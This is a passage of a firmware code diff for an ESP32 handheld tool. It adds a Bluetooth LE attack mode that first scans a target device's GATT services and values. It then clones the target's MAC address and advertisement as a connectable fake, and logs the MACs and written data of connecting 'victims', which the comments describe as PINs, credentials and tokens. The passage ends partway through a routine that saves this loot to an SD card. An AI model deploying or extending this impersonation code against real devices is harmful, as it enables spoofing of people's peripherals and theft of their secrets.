+    tft.fillRect(0, ICON_BAR_BOTTOM + 1, SCREEN_WIDTH, SCREEN_HEIGHT - ICON_BAR_BOTTOM - 1, HALEHOUND_BLACK);
+    drawIconBar();
+    drawReconView();
+
+    // Show target info
+    char macStr[18];
+    bpMacToStr(target->mac, macStr, sizeof(macStr));
+    char buf[40];
+    snprintf(buf, sizeof(buf), "Target: %s", macStr);
+    drawReconStatus(0, buf, HALEHOUND_CYAN);
+
+    // Stop BLE scanning
+    if (S->pScan) {
+        S->pScan->stop();
+        S->pScan->setAdvertisedDeviceCallbacks(nullptr, false);
+        S->pScan = nullptr;
+    }
+    S->scanning = false;
+    BLEDevice::deinit(false);
+    delay(100);
+
+    // Re-init BLE for GATT client mode
+    releaseClassicBtMemory();
+    BLEDevice::init("");
+    delay(150);
+
+    drawReconStatus(1, "Connecting...", HALEHOUND_HOTPINK);
+
+    // Create GATT client
+    BLEClient* pClient = BLEDevice::createClient();
+    if (!pClient) {
+        drawReconStatus(1, "ERROR: Client create failed", 0xF800);
+        delay(2000);
+        goBackToListen();
+        return;
+    }
+
+    // Connect to target — use string address (matches WhisperPair's proven pattern)
+    char addrStr[18];
+    bpMacToStr(target->mac, addrStr, sizeof(addrStr));
+    std::string addrString(addrStr);
+    BLEAddress addr(addrString);
+
+    #if CYD_DEBUG
+    Serial.printf("[PREDATOR] RECON: Connecting to %s (type=%d)...\n", addrStr, target->addrType);
+    #endif
+
+    bool connected = pClient->connect(addr, (esp_ble_addr_type_t)target->addrType);
+
+    if (!connected) {
+        drawReconStatus(1, "Connection failed!", 0xF800);
+        drawReconStatus(2, "Target may not accept GATT", HALEHOUND_GUNMETAL);
+        drawReconStatus(3, "Use REPLAY instead", HALEHOUND_GUNMETAL);
+        pClient = nullptr;  // deinit cleans up tracked clients
+        BLEDevice::deinit(false);
+        delay(2000);
+
+        // Re-init for scanning and go back to TARGET
+        releaseClassicBtMemory();
+        BLEDevice::init("");
+        delay(150);
+        S->pScan = BLEDevice::getScan();
+        if (S->pScan) {
+            S->pScan->setActiveScan(false);
+            S->pScan->setInterval(100);
+            S->pScan->setWindow(99);
+            S->pScan->setAdvertisedDeviceCallbacks(&predatorCB, true);
+            S->scanning = true;
+            S->pScan->start(5, bpScanComplete, false);
+        }
+        S->phase = PHASE_TARGET;
+        tft.fillRect(0, ICON_BAR_BOTTOM + 1, SCREEN_WIDTH, SCREEN_HEIGHT - ICON_BAR_BOTTOM - 1, HALEHOUND_BLACK);
+        drawIconBar();
+        drawTargetOverlay();
+        return;
+    }
+
+    drawReconStatus(1, "Connected! Discovering...", HALEHOUND_MAGENTA);
+
+    #if CYD_DEBUG
+    Serial.printf("[PREDATOR] RECON: Connected to %s\n", macStr);
+    #endif
+
+    // Discover all services
+    std::map<std::string, BLERemoteService*>* svcMap = pClient->getServices();
+    if (!svcMap || svcMap->empty()) {
+        drawReconStatus(2, "No GATT services found!", 0xF800);
+        pClient->disconnect();
+        pClient = nullptr;  // deinit cleans up tracked clients
+        BLEDevice::deinit(false);
+        delay(2000);
+
+        releaseClassicBtMemory();
+        BLEDevice::init("");
+        delay(150);
+        S->pScan = BLEDevice::getScan();
+        if (S->pScan) {
+            S->pScan->setActiveScan(false);
+            S->pScan->setInterval(100);
+            S->pScan->setWindow(99);
+            S->pScan->setAdvertisedDeviceCallbacks(&predatorCB, true);
+            S->scanning = true;
+            S->pScan->start(5, bpScanComplete, false);
+        }
+        S->phase = PHASE_TARGET;
+        tft.fillRect(0, ICON_BAR_BOTTOM + 1, SCREEN_WIDTH, SCREEN_HEIGHT - ICON_BAR_BOTTOM - 1, HALEHOUND_BLACK);
+        drawIconBar();
+        drawTargetOverlay();
+        return;
+    }
+
+    // Enumerate services and characteristics
+    int displayLine = 2;
+    for (auto& kv : *svcMap) {
+        if (S->hpSvcCount >= HP_MAX_SERVICES) break;
+
+        BLERemoteService* pSvc = kv.second;
+        BLEUUID svcUUID = pSvc->getUUID();
+
+        HpServiceInfo* si = &S->hpSvcs[S->hpSvcCount];
+        memset(si, 0, sizeof(HpServiceInfo));
+        si->charStart = S->hpCharCount;
+
+        // Extract UUID (16-bit or 128-bit)
+        {
+            esp_bt_uuid_t* native = svcUUID.getNative();
+            if (native->len == ESP_UUID_LEN_16) {
+                si->uuid16 = native->uuid.uuid16;
+            } else if (native->len == ESP_UUID_LEN_128) {
+                memcpy(si->uuid128, native->uuid.uuid128, 16);
+            } else if (native->len == ESP_UUID_LEN_32) {
+                si->uuid16 = (uint16_t)(native->uuid.uuid32 & 0xFFFF);
+            }
+        }
+
+        // Get characteristics for this service
+        std::map<std::string, BLERemoteCharacteristic*>* charMap = pSvc->getCharacteristics();
+        if (charMap) {
+            for (auto& ckv : *charMap) {
+                if (S->hpCharCount >= HP_MAX_CHARS) break;
+
+                BLERemoteCharacteristic* pChar = ckv.second;
+                BLEUUID charUUID = pChar->getUUID();
+
+                HpCharInfo* ci = &S->hpChars[S->hpCharCount];
+                memset(ci, 0, sizeof(HpCharInfo));
+                ci->svcIdx = S->hpSvcCount;
+
+                // Extract char UUID
+                {
+                    esp_bt_uuid_t* cNative = charUUID.getNative();
+                    if (cNative->len == ESP_UUID_LEN_16) {
+                        ci->uuid16 = cNative->uuid.uuid16;
+                    } else if (cNative->len == ESP_UUID_LEN_128) {
+                        memcpy(ci->uuid128, cNative->uuid.uuid128, 16);
+                    } else if (cNative->len == ESP_UUID_LEN_32) {
+                        ci->uuid16 = (uint16_t)(cNative->uuid.uuid32 & 0xFFFF);
+                    }
+                }
+
+                // Build properties byte from canRead/canWrite/canNotify helpers
+                ci->properties = 0;
+                if (pChar->canRead())          ci->properties |= ESP_GATT_CHAR_PROP_BIT_READ;
+                if (pChar->canWrite())         ci->properties |= ESP_GATT_CHAR_PROP_BIT_WRITE;
+                if (pChar->canWriteNoResponse()) ci->properties |= ESP_GATT_CHAR_PROP_BIT_WRITE_NR;
+                if (pChar->canNotify())        ci->properties |= ESP_GATT_CHAR_PROP_BIT_NOTIFY;
+                if (pChar->canIndicate())      ci->properties |= ESP_GATT_CHAR_PROP_BIT_INDICATE;
+
+                // Read cached value if readable
+                if (ci->properties & ESP_GATT_CHAR_PROP_BIT_READ) {
+                    try {
+                        std::string val = pChar->readValue();
+                        ci->cachedValLen = (val.length() > HP_MAX_READ_VAL) ? HP_MAX_READ_VAL : val.length();
+                        if (ci->cachedValLen > 0) {
+                            memcpy(ci->cachedVal, val.c_str(), ci->cachedValLen);
+                        }
+                    } catch (...) {
+                        ci->cachedValLen = 0;
+                    }
+                }
+
+                si->charCount++;
+                S->hpCharCount++;
+            }
+        }
+
+        // Display this service on screen
+        if (displayLine < 14) {
+            drawReconService(displayLine, si->uuid16, si->uuid128, si->charCount);
+            displayLine++;
+
+            // Show first few characteristics
+            for (int c = si->charStart; c < si->charStart + si->charCount && displayLine < 14; c++) {
+                drawReconChar(displayLine, &S->hpChars[c]);
+                displayLine++;
+            }
+        }
+
+        S->hpSvcCount++;
+    }
+
+    // Disconnect from target
+    pClient->disconnect();
+    pClient = nullptr;  // deinit cleans up tracked clients
+    delay(200);
+
+    S->hpReconDone = true;
+
+    #if CYD_DEBUG
+    Serial.printf("[PREDATOR] RECON complete: %d services, %d characteristics\n",
+                  S->hpSvcCount, S->hpCharCount);
+    #endif
+
+    // Show summary
+    char summary[48];
+    snprintf(summary, sizeof(summary), "Found %d SVCs, %d CHARs",
+             S->hpSvcCount, S->hpCharCount);
+    if (displayLine < 15) {
+        drawReconStatus(displayLine, summary, HALEHOUND_CYAN);
+        displayLine++;
+    }
+    if (displayLine < 15) {
+        drawReconStatus(displayLine, "Building honeypot...", HALEHOUND_HOTPINK);
+    }
+    delay(1000);
+
+    // Deinit BLE client mode before starting GATTS server
+    BLEDevice::deinit(false);
+    delay(100);
+
+    // Auto-transition to HONEYPOT
+    startHoneypot();
+}
+
+static void handleReconTouch() {
+    uint16_t tx, ty;
+    bool touching = getTouchPoint(&tx, &ty);
+
+    if (bpWaitForRelease) {
+        if (!touching) bpWaitForRelease = false;
+        return;
+    }
+    if (!touching) return;
+    if (millis() - S->lastIconTap < 350) return;
+    S->lastIconTap = millis();
+    bpWaitForRelease = true;
+
+    // Icon bar back → abort RECON
+    if (ty >= ICON_BAR_Y && ty <= ICON_BAR_BOTTOM + 4) {
+        // RECON is synchronous so this handler only runs between phases.
+        // If we get here, RECON must have completed — just go back.
+        goBackToListen();
+    }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// PHASE 5: HONEYPOT — GATT Server Clone + Loot Logging
+// Build GATTS server from RECON data, broadcast connectable ADV, log loot
+// ═══════════════════════════════════════════════════════════════════════════
+
+// Forward reference — S is already declared but hpGattsHandler needs it
+static void hpGattsHandler(esp_gatts_cb_event_t event, esp_gatt_if_t gatts_if,
+                           esp_ble_gatts_cb_param_t* param);
+static void hpStartAdvertising();
+static void hpBuildNextService();
+static void hpBuildNextChar();
+
+static void hpAddLoot(uint8_t type, const uint8_t* mac, uint16_t charHandle,
+                      const uint8_t* data, uint8_t dataLen) {
+    if (!S) return;
+    uint8_t idx = S->hpLootCount % HP_MAX_LOOT;
+    HpLootEntry* e = &S->hpLoot[idx];
+    e->timestamp = millis();
+    e->type = type;
+    e->charHandle = charHandle;
+    e->dataLen = (dataLen > 20) ? 20 : dataLen;
+    if (mac) memcpy(e->victimMAC, mac, 6);
+    if (data && e->dataLen > 0) memcpy(e->data, data, e->dataLen);
+    S->hpLootCount++;
+}
+
+// Find which HpCharInfo corresponds to an assigned GATTS handle
+static HpCharInfo* hpFindCharByHandle(uint16_t handle) {
+    for (int i = 0; i < S->hpCharCount; i++) {
+        if (S->hpChars[i].handle == handle) return &S->hpChars[i];
+    }
+    return nullptr;
+}
+
+// GATTS event handler — the core of the honeypot
+static void hpGattsHandler(esp_gatts_cb_event_t event, esp_gatt_if_t gatts_if,
+                           esp_ble_gatts_cb_param_t* param) {
+    if (!S || !S->hpActive) return;
+
+    switch (event) {
+        case ESP_GATTS_REG_EVT: {
+            S->hpGattsIf = gatts_if;
+            S->hpBuildStep = 0;
+            S->hpBuildCharIdx = 0;
+            // Start building first service
+            hpBuildNextService();
+            break;
+        }
+
+        case ESP_GATTS_CREATE_EVT: {
+            if (param->create.status != ESP_GATT_OK) {
+                #if CYD_DEBUG
+                Serial.printf("[HP] Service create failed: %d\n", param->create.status);
+                #endif
+                break;
+            }
+            // Store service handle
+            if (S->hpBuildStep < S->hpSvcCount) {
+                S->hpSvcs[S->hpBuildStep].handle = param->create.service_handle;
+
+                // Start the service
+                esp_ble_gatts_start_service(param->create.service_handle);
+            }
+            break;
+        }
+
+        case ESP_GATTS_START_EVT: {
+            if (param->start.status != ESP_GATT_OK) break;
+
+            // Add characteristics for this service
+            if (S->hpBuildStep < S->hpSvcCount) {
+                HpServiceInfo* si = &S->hpSvcs[S->hpBuildStep];
+                if (si->charCount > 0) {
+                    S->hpBuildCharIdx = si->charStart;
+                    hpBuildNextChar();
+                } else {
+                    // No chars in this service, move to next service
+                    S->hpBuildStep++;
+                    if (S->hpBuildStep < S->hpSvcCount) {
+                        hpBuildNextService();
+                    } else {
+                        // All services built — start advertising
+                        hpStartAdvertising();
+                    }
+                }
+            }
+            break;
+        }
+
+        case ESP_GATTS_ADD_CHAR_EVT: {
+            if (param->add_char.status != ESP_GATT_OK) {
+                #if CYD_DEBUG
+                Serial.printf("[HP] Char add failed: %d\n", param->add_char.status);
+                #endif
+            }
+            // Store assigned handle
+            for (int i = 0; i < S->hpCharCount; i++) {
+                if (S->hpChars[i].handle == 0) {
+                    // Find the char we just added by checking build index
+                    if (i == S->hpBuildCharIdx) {
+                        S->hpChars[i].handle = param->add_char.attr_handle;
+                        break;
+                    }
+                }
+            }
+
+            S->hpBuildCharIdx++;
+
+            // Check if more chars to add for current service
+            HpServiceInfo* si = &S->hpSvcs[S->hpBuildStep];
+            if (S->hpBuildCharIdx < si->charStart + si->charCount) {
+                hpBuildNextChar();
+            } else {
+                // Move to next service
+                S->hpBuildStep++;
+                if (S->hpBuildStep < S->hpSvcCount) {
+                    hpBuildNextService();
+                } else {
+                    // All services + chars built — start advertising
+                    hpStartAdvertising();
+                }
+            }
+            break;
+        }
+
+        case ESP_GATTS_CONNECT_EVT: {
+            S->hpConnId = param->connect.conn_id;
+            memcpy(S->hpVictimMAC, param->connect.remote_bda, 6);
+            S->hpConnCount++;
+
+            hpAddLoot(HP_EVT_CONNECT, param->connect.remote_bda, 0, nullptr, 0);
+
+            #if CYD_DEBUG
+            Serial.printf("[HP] VICTIM CONNECTED: %02X:%02X:%02X:%02X:%02X:%02X\n",
+                          param->connect.remote_bda[0], param->connect.remote_bda[1],
+                          param->connect.remote_bda[2], param->connect.remote_bda[3],
+                          param->connect.remote_bda[4], param->connect.remote_bda[5]);
+            #endif
+            break;
+        }
+
+        case ESP_GATTS_READ_EVT: {
+            // Return cached value and log the read
+            HpCharInfo* ci = hpFindCharByHandle(param->read.handle);
+
+            esp_gatt_rsp_t rsp;
+            memset(&rsp, 0, sizeof(rsp));
+            rsp.attr_value.handle = param->read.handle;
+
+            if (ci && ci->cachedValLen > 0) {
+                rsp.attr_value.len = ci->cachedValLen;
+                memcpy(rsp.attr_value.value, ci->cachedVal, ci->cachedValLen);
+            } else {
+                // Return empty response
+                rsp.attr_value.len = 0;
+            }
+
+            esp_ble_gatts_send_response(gatts_if, param->read.conn_id,
+                                        param->read.trans_id, ESP_GATT_OK, &rsp);
+
+            hpAddLoot(HP_EVT_READ, S->hpVictimMAC, param->read.handle, nullptr, 0);
+
+            #if CYD_DEBUG
+            Serial.printf("[HP] READ handle=%d\n", param->read.handle);
+            #endif
+            break;
+        }
+
+        case ESP_GATTS_WRITE_EVT: {
+            // ★ THE GOLD — log the written data (PINs, creds, tokens)
+            if (param->write.need_rsp) {
+                esp_ble_gatts_send_response(gatts_if, param->write.conn_id,
+                                            param->write.trans_id, ESP_GATT_OK, nullptr);
+            }
+
+            hpAddLoot(HP_EVT_WRITE, S->hpVictimMAC, param->write.handle,
+                      param->write.value, param->write.len);
+
+            #if CYD_DEBUG
+            Serial.printf("[HP] ★ WRITE handle=%d len=%d data=", param->write.handle, param->write.len);
+            for (int i = 0; i < param->write.len && i < 20; i++) {
+                Serial.printf("%02X", param->write.value[i]);
+            }
+            Serial.println();
+            #endif
+            break;
+        }
+
+        case ESP_GATTS_DISCONNECT_EVT: {
+            hpAddLoot(HP_EVT_DISCONNECT, S->hpVictimMAC, 0, nullptr, 0);
+
+            #if CYD_DEBUG
+            Serial.println("[HP] VICTIM DISCONNECTED");
+            #endif
+
+            // Restart advertising for next victim
+            if (S->hpActive) {
+                hpStartAdvertising();
+            }
+            break;
+        }
+
+        default:
+            break;
+    }
+}
+
+static void hpBuildNextService() {
+    if (S->hpBuildStep >= S->hpSvcCount) return;
+    HpServiceInfo* si = &S->hpSvcs[S->hpBuildStep];
+
+    esp_gatt_srvc_id_t svcId;
+    memset(&svcId, 0, sizeof(svcId));
+    svcId.is_primary = true;
+
+    if (si->uuid16 != 0) {
+        svcId.id.uuid.len = ESP_UUID_LEN_16;
+        svcId.id.uuid.uuid.uuid16 = si->uuid16;
+    } else {
+        svcId.id.uuid.len = ESP_UUID_LEN_128;
+        memcpy(svcId.id.uuid.uuid.uuid128, si->uuid128, 16);
+    }
+
+    // num_handle: 1 for service + 2 per characteristic (char decl + char value)
+    uint16_t numHandle = 1 + (si->charCount * 2);
+    esp_ble_gatts_create_service(S->hpGattsIf, &svcId, numHandle);
+}
+
+static void hpBuildNextChar() {
+    if (S->hpBuildCharIdx >= S->hpCharCount) return;
+    HpCharInfo* ci = &S->hpChars[S->hpBuildCharIdx];
+    HpServiceInfo* si = &S->hpSvcs[ci->svcIdx];
+
+    esp_bt_uuid_t charUUID;
+    memset(&charUUID, 0, sizeof(charUUID));
+    if (ci->uuid16 != 0) {
+        charUUID.len = ESP_UUID_LEN_16;
+        charUUID.uuid.uuid16 = ci->uuid16;
+    } else {
+        charUUID.len = ESP_UUID_LEN_128;
+        memcpy(charUUID.uuid.uuid128, ci->uuid128, 16);
+    }
+
+    // Map BLE properties to GATT permissions
+    esp_gatt_perm_t perm = 0;
+    if (ci->properties & ESP_GATT_CHAR_PROP_BIT_READ)    perm |= ESP_GATT_PERM_READ;
+    if (ci->properties & ESP_GATT_CHAR_PROP_BIT_WRITE)   perm |= ESP_GATT_PERM_WRITE;
+    if (ci->properties & ESP_GATT_CHAR_PROP_BIT_WRITE_NR) perm |= ESP_GATT_PERM_WRITE;
+
+    // Ensure at least read permission so we can respond
+    if (perm == 0) perm = ESP_GATT_PERM_READ;
+
+    esp_attr_value_t charVal;
+    memset(&charVal, 0, sizeof(charVal));
+    charVal.attr_max_len = HP_MAX_READ_VAL;
+    charVal.attr_len = ci->cachedValLen;
+    charVal.attr_value = ci->cachedVal;
+
+    esp_attr_control_t control;
+    control.auto_rsp = ESP_GATT_RSP_BY_APP;  // We handle READ/WRITE in the callback
+
+    esp_ble_gatts_add_char(si->handle, &charUUID, perm,
+                           (esp_gatt_char_prop_t)ci->properties, &charVal, &control);
+}
+
+static void hpStartAdvertising() {
+    if (!S || !S->hpActive) return;
+
+    int realIdx = bpFilteredToReal(S->detailIdx);
+    if (realIdx < 0) return;
+    ReconDevice* target = &S->devices[realIdx];
+
+    // Clone target's MAC — same logic as doReplayBroadcast()
+    uint8_t replayMac[6];
+    memcpy(replayMac, target->mac, 6);
+    if (target->addrType == BLE_ADDR_TYPE_PUBLIC) {
+        replayMac[0] |= 0xC0;  // Force random-static for public MAC
+    }
+    esp_ble_gap_set_rand_addr(replayMac);
+
+    // Send target's raw ADV payload
+    esp_ble_gap_config_adv_data_raw(target->payload,
+                                     target->payloadLen > 0 ? target->payloadLen : 31);
+    delay(1);
+
+    // KEY DIFFERENCE: ADV_TYPE_IND = connectable undirected (not NONCONN_IND)
+    esp_ble_adv_params_t advP;
+    memset(&advP, 0, sizeof(advP));
+    advP.adv_int_min = 0x20;
+    advP.adv_int_max = 0x40;
+    advP.adv_type = ADV_TYPE_IND;                    // ★ CONNECTABLE
+    advP.own_addr_type = BLE_ADDR_TYPE_RANDOM;
+    advP.channel_map = ADV_CHNL_ALL;
+    advP.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;
+
+    esp_ble_gap_start_advertising(&advP);
+    S->hpAdvStarted = true;
+
+    #if CYD_DEBUG
+    Serial.println("[HP] Connectable advertising started");
+    #endif
+}
+
+static void startHoneypot() {
+    if (!S->hpReconDone) return;
+
+    // Re-init BLE for GATTS server
+    releaseClassicBtMemory();
+    BLEDevice::init("HaleHound");
+    delay(150);
+
+    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
+    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
+
+    S->hpActive = true;
+    S->hpAdvStarted = false;
+    S->hpBuildStep = 0;
+    S->hpBuildCharIdx = 0;
+
+    // Register GATTS callback — this triggers the service build chain
+    esp_ble_gatts_register_callback(hpGattsHandler);
+    esp_ble_gatts_app_register(0);  // app_id = 0
+
+    // Phase transition
+    S->phase = PHASE_HONEYPOT;
+    S->staticDrawn = false;
+    S->hpStatusTime = 0;
+    S->hpStatusMsg[0] = '\0';
+    tft.fillRect(0, ICON_BAR_BOTTOM + 1, SCREEN_WIDTH, SCREEN_HEIGHT - ICON_BAR_BOTTOM - 1, HALEHOUND_BLACK);
+    drawIconBar();
+
+    // Draw immediately — don't wait for first loop tick
+    drawHoneypotStatic();
+    drawHoneypotLoot();
+    S->lastDisplayUpdate = millis();
+
+    #if CYD_DEBUG
+    Serial.printf("[HP] Honeypot started: %d SVCs, %d CHARs\n", S->hpSvcCount, S->hpCharCount);
+    #endif
+}
+
+static void stopHoneypot() {
+    S->hpActive = false;
+
+    if (S->hpAdvStarted) {
+        esp_ble_gap_stop_advertising();
+        S->hpAdvStarted = false;
+    }
+
+    esp_ble_gatts_app_unregister(S->hpGattsIf);
+    BLEDevice::deinit(false);
+    delay(100);
+
+    // Re-init for scanning
+    releaseClassicBtMemory();
+    BLEDevice::init("");
+    delay(150);
+
+    S->pScan = BLEDevice::getScan();
+    if (S->pScan) {
+        S->pScan->setActiveScan(false);
+        S->pScan->setInterval(100);
+        S->pScan->setWindow(99);
+        S->pScan->setAdvertisedDeviceCallbacks(&predatorCB, true);
+        S->scanning = true;
+        S->pScan->start(5, bpScanComplete, false);
+    }
+
+    S->staticDrawn = false;
+    S->phase = PHASE_LISTEN;
+
+    tft.fillRect(0, ICON_BAR_BOTTOM + 1, SCREEN_WIDTH, SCREEN_HEIGHT - ICON_BAR_BOTTOM - 1, HALEHOUND_BLACK);
+    drawIconBar();
+    drawHeader();
+    drawDeviceList();
+
+    #if CYD_DEBUG
+    Serial.printf("[HP] Honeypot stopped. Connections: %d, Loot: %d\n",
+                  S->hpConnCount, S->hpLootCount);
+    #endif
+}
+
+// ── HONEYPOT UI ─────────────────────────────────────────────────────────
+
+static void hpSetStatus(const char* msg, uint16_t color) {
+    strncpy(S->hpStatusMsg, msg, 31);
+    S->hpStatusMsg[31] = '\0';
+    S->hpStatusColor = color;
+    S->hpStatusTime = millis();
+}
+
+static void drawHoneypotStatic() {
+    tft.setTextSize(1);
+
+    // Title
+    tft.fillRect(0, SCALE_Y(38), SCREEN_WIDTH, SCALE_H(20), HALEHOUND_BLACK);
+    drawGlitchText(SCALE_Y(55), "PREDATOR", &Nosifer_Regular10pt7b);
+
+    tft.setFreeFont(NULL);
+    tft.setTextSize(1);
+
+    // Phase label
+    tft.setTextColor(HALEHOUND_HOTPINK, HALEHOUND_BLACK);
+    tft.setCursor(SCALE_X(55), SCALE_Y(42));
+    tft.print(">> HONEYPOT <<");
+
+    // Target info
+    int realIdx = bpFilteredToReal(S->detailIdx);
+    if (realIdx >= 0) {
+        ReconDevice* target = &S->devices[realIdx];
+        char macStr[18];
+        bpMacToStr(target->mac, macStr, sizeof(macStr));
+
+        int y = SCALE_Y(66);
+        tft.setTextColor(HALEHOUND_HOTPINK, HALEHOUND_BLACK);
+        tft.setCursor(SCALE_X(5), y);
+        tft.print("Clone: ");
+        tft.setTextColor(HALEHOUND_CYAN, HALEHOUND_BLACK);
+        tft.print(macStr);
+
+        y += SCALE_H(13);
+        tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_BLACK);
+        tft.setCursor(SCALE_X(5), y);
+        tft.printf("SVCs:%d  CHARs:%d", S->hpSvcCount, S->hpCharCount);
+    }
+
+    // ── Prominent status banner ────────────────────────────────────────
+    int bannerY = SCALE_Y(92);
+    tft.fillRect(0, bannerY, SCREEN_WIDTH, SCALE_H(18), HALEHOUND_DARK);
+    tft.drawLine(0, bannerY, SCREEN_WIDTH, bannerY, HALEHOUND_VIOLET);
+    tft.drawLine(0, bannerY + SCALE_H(17), SCREEN_WIDTH, bannerY + SCALE_H(17), HALEHOUND_VIOLET);
+
+    // Buttons at bottom — bigger, clearer
+    int btnW = SCALE_W(65);
+    int btnH = SCALE_H(26);
+    int btnY = SCREEN_HEIGHT - SCALE_H(32);
+
+    int stopX  = SCALE_X(5);
+    int saveX  = SCALE_X(80);
+    int clearX = SCALE_X(160);
+
+    // STOP — bright, obvious
+    tft.fillRect(stopX, btnY, btnW, btnH, HALEHOUND_DARK);
+    tft.drawRect(stopX, btnY, btnW, btnH, HALEHOUND_HOTPINK);
+    tft.drawRect(stopX + 1, btnY + 1, btnW - 2, btnH - 2, HALEHOUND_HOTPINK);
+    tft.setTextColor(HALEHOUND_HOTPINK);
+    tft.setCursor(stopX + SCALE_X(14), btnY + SCALE_H(8));
+    tft.print("STOP");
+
+    // SAVE
+    tft.fillRect(saveX, btnY, btnW, btnH, HALEHOUND_DARK);
+    tft.drawRect(saveX, btnY, btnW, btnH, HALEHOUND_MAGENTA);
+    tft.drawRect(saveX + 1, btnY + 1, btnW - 2, btnH - 2, HALEHOUND_MAGENTA);
+    tft.setTextColor(HALEHOUND_MAGENTA);
+    tft.setCursor(saveX + SCALE_X(14), btnY + SCALE_H(8));
+    tft.print("SAVE");
+
+    // CLEAR
+    tft.fillRect(clearX, btnY, btnW, btnH, HALEHOUND_DARK);
+    tft.drawRect(clearX, btnY, btnW, btnH, HALEHOUND_VIOLET);
+    tft.setTextColor(HALEHOUND_VIOLET);
+    tft.setCursor(clearX + SCALE_X(10), btnY + SCALE_H(8));
+    tft.print("CLEAR");
+
+    S->staticDrawn = true;
+}
+
+static void drawHoneypotLoot() {
+    uint32_t now = millis();
+    tft.setTextSize(1);
+
+    // ── Status banner (between header and loot) ──────────────────────
+    int bannerY = SCALE_Y(92);
+    int bannerH = SCALE_H(18);
+    tft.fillRect(1, bannerY + 1, SCREEN_WIDTH - 2, bannerH - 2, HALEHOUND_DARK);
+
+    // Left side: connection count + loot count
+    tft.setTextColor(HALEHOUND_CYAN, HALEHOUND_DARK);
+    tft.setCursor(SCALE_X(5), bannerY + SCALE_H(4));
+    tft.printf("Conns:%d  Loot:%d", S->hpConnCount, S->hpLootCount);
+
+    // Right side: LIVE indicator with pulsing dot
+    if (S->hpAdvStarted) {
+        // Pulsing dot — alternates between hotpink and dark every 500ms
+        bool pulse = ((now / 500) % 2) == 0;
+        uint16_t dotColor = pulse ? HALEHOUND_HOTPINK : HALEHOUND_MAGENTA;
+        tft.fillCircle(SCALE_X(180), bannerY + bannerH / 2, 4, dotColor);
+        tft.setTextColor(HALEHOUND_HOTPINK, HALEHOUND_DARK);
+        tft.setCursor(SCALE_X(190), bannerY + SCALE_H(4));
+        tft.print("LIVE");
+    } else {
+        tft.setTextColor(HALEHOUND_GUNMETAL, HALEHOUND_DARK);
+        tft.setCursor(SCALE_X(180), bannerY + SCALE_H(4));
+        tft.print("BUILDING...");
+    }
+
+    // ── Status message (if set, shows for 3 seconds) ─────────────────
+    int statusY = bannerY + bannerH + 1;
+    int statusH = SCALE_H(14);
+    tft.fillRect(0, statusY, SCREEN_WIDTH, statusH, HALEHOUND_BLACK);
+    if (S->hpStatusTime > 0 && (now - S->hpStatusTime) < 3000) {
+        tft.setTextColor(S->hpStatusColor, HALEHOUND_BLACK);
+        tft.setCursor(SCALE_X(5), statusY + 2);
+        tft.print(S->hpStatusMsg);
+    }
+
+    // ── Loot display area ────────────────────────────────────────────
+    int lootY = statusY + statusH + 1;
+    int btnTop = SCREEN_HEIGHT - SCALE_H(34);
+    int lootH = btnTop - lootY - 2;
+    int lineH = SCALE_H(13);
+    int maxLines = lootH / lineH;
+
+    // Clear loot area
+    tft.fillRect(0, lootY, SCREEN_WIDTH, lootH, HALEHOUND_BLACK);
+
+    if (S->hpLootCount == 0) {
+        // Animated waiting text with cycling dots
+        int dots = ((now / 400) % 4);
+        tft.setTextColor(HALEHOUND_VIOLET, HALEHOUND_BLACK);
+        tft.setCursor(SCALE_X(30), lootY + lootH / 3);
+        tft.print("Waiting for victims");
+        for (int d = 0; d < dots; d++) tft.print(".");
+        tft.print("   ");  // Clear trailing dots from previous frame
+
+        // Helpful hint
+        tft.setTextColor(HALEHOUND_GUNMETAL, HALEHOUND_BLACK);
+        tft.setCursor(SCALE_X(15), lootY + lootH / 3 + SCALE_H(16));
+        tft.print("Connect with nRF Connect app");
+        tft.setCursor(SCALE_X(15), lootY + lootH / 3 + SCALE_H(30));
+        tft.print("to test WRITE capture");
+        return;
+    }
+
+    // Show loot entries (newest at bottom, scrollable)
+    int totalEntries = (S->hpLootCount > HP_MAX_LOOT) ? HP_MAX_LOOT : S->hpLootCount;
+    int startIdx = 0;
+    if (totalEntries > maxLines) {
+        startIdx = totalEntries - maxLines - S->hpLootScroll;
+        if (startIdx < 0) startIdx = 0;
+    }
+
+    int y = lootY;
+    for (int i = startIdx; i < totalEntries && (y + lineH) < (lootY + lootH); i++) {
+        int ringIdx = i;
+        if (S->hpLootCount > HP_MAX_LOOT) {
+            ringIdx = (S->hpLootCount - HP_MAX_LOOT + i) % HP_MAX_LOOT;
+        }
+        HpLootEntry* e = &S->hpLoot[ringIdx];
+
+        tft.setCursor(SCALE_X(3), y + 2);
+        tft.setTextSize(1);
+
+        switch (e->type) {
+            case HP_EVT_CONNECT:
+                tft.setTextColor(HALEHOUND_CYAN);
+                tft.printf("[!] CONN %02X:%02X:%02X:%02X:%02X:%02X",
+                           e->victimMAC[0], e->victimMAC[1], e->victimMAC[2],
+                           e->victimMAC[3], e->victimMAC[4], e->victimMAC[5]);
+                break;
+
+            case HP_EVT_DISCONNECT:
+                tft.setTextColor(HALEHOUND_CYAN);
+                tft.print("[!] DISCONNECTED");
+                break;
+
+            case HP_EVT_READ:
+                tft.setTextColor(HALEHOUND_GUNMETAL);
+                tft.printf("[R] H:0x%04X read", e->charHandle);
+                break;
+
+            case HP_EVT_WRITE:
+                tft.setTextColor(HALEHOUND_HOTPINK);
+                tft.printf("[W] 0x%04X ", e->charHandle);
+                // Show data as hex + ASCII
+                for (int b = 0; b < e->dataLen && b < 8; b++) {
+                    tft.printf("%02X", e->data[b]);
+                }
+                if (e->dataLen > 0) {
+                    tft.print(" \"");
+                    for (int b = 0; b < e->dataLen && b < 8; b++) {
+                        char c = (char)e->data[b];
+                        tft.print((c >= 0x20 && c < 0x7F) ? c : '.');
+                    }
+                    tft.print("\"");
+                }
+                break;
+        }
+        y += lineH;
+    }
+}
+
+static void hpSaveLootToSD() {
+    if (S->hpLootCount == 0) {
+        hpSetStatus("No loot to save!", HALEHOUND_GUNMETAL);
+        return;
+    }
+
+    // Init SD card (same pattern as WhisperPair)
+    SPI.end();
+    delay(10);
+    SPI.begin(18, 19, 23);
+    pinMode(SD_CS, OUTPUT);
+    digitalWrite(SD_CS, HIGH);
